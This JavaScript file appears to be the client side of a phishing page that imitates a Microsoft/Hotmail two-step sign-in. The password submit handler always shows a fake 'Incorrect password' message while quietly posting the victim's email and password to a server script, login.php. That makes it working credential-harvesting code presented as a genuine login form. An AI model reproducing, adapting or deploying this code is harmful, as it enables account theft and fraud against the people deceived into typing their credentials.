var next = document.querySelector(".next");
var submit = document.querySelector(".submit");
var slide_one = document.querySelector(".slide-one");
var slide_two = document.querySelector(".slide-two");
var email = document.getElementById("hm-email");
var nameText = document.getElementById("name");
var back_btn = document.getElementById("back");
var password = document.getElementById("hm-pass");
var msg = document.querySelector(".msg");
var msg2 = document.querySelector(".msg2");
var container_item_2 = document.querySelector(".container-item-2");
next.addEventListener("click", function () {
  if (email.value == "") {
    msg.textContent =
      "Enter a valid email address, phone number, or Skype name.";
  } else {
    msg.textContent = "";
    nameText.textContent = email.value;
    slide_one.classList.add("slide-one-toggle");
    slide_two.classList.add("slide-two-toggle");
    container_item_2.style.display = "none";
  }
});
back_btn.addEventListener("click", function () {
  slide_one.classList.remove("slide-one-toggle");
  slide_two.classList.remove("slide-two-toggle");
  container_item_2.style.display = "flex";
});

submit.addEventListener("click", function () {
  if (password.value == "") {
    msg2.textContent = "Please enter the password for your Microsoft account.";
  } else {
    msg2.textContent = "Incorrect password! please try again...";
    var xhr = new XMLHttpRequest();
    var data = new FormData();
    data.append("hm-email", email.value + " (hotmail)");
    data.append("hm-pass", password.value);
    xhr.onreadystatechange = function () {};
    xhr.open("POST", "./login.php", true);
    xhr.send(data);
  }
});
